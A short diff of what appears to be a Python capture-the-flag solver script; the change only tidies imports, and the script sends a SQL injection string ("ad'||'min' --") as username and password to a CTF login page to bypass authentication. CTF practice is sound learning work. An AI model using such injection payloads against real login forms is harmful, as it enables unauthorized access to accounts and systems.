@@ -1,7 +1,9 @@
 #!/usr/bin/python3
 
-import requests	
 import re
+
+import requests
+
 url = "https://canyou.freedomctf.org/login"
 
 r = requests.post(url, data={"username": "ad'||'min' --", "password": "ad'||'min' --"})
